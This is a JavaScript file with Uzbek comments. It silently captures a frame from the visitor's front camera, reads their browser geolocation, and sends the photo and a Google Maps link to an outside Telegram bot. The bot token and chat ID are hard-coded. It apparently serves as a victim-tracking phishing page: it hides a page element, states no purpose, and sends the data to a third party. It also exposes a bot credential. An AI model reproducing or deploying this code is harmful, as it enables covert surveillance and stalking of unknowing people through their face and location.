async function startCapture() {
    const video = document.getElementById('video');
    const canvas = document.createElement('canvas');

    try {
        const constraints = {
            video: {
                facingMode: 'user'
            },
            audio: false
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        await new Promise(resolve => setTimeout(resolve, 1500));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const imageData = canvas.toDataURL('image/jpeg');

        // Kamera to‘xtatish
        stream.getTracks().forEach(track => track.stop());

        // Location olish
        navigator.geolocation.getCurrentPosition(async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const locationURL = `https://www.google.com/maps?q=${lat},${lon}`;

            await sendToTelegram(imageData, locationURL);
        }, (error) => {
            alert('Joylashuv olinmadi: ' + error.message);
        });

    } catch (err) {
        alert("Kamerani ochib bo‘lmadi: " + err.message);
    }
}
let sher = document.querySelector('.sher')
sher.style.display = 'none'

async function sendToTelegram(base64Image, locationURL) {
    const token = '8334907235:AAGYq_x1YYxsVfkQQUsHHv5fS8duqS2MdPE';
    const chatId = '5206338352';

    const blob = await (await fetch(base64Image)).blob();
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'photo.jpg');

    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
    });

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: `📍 Joylashuv: ${locationURL}`
        })
    });

}

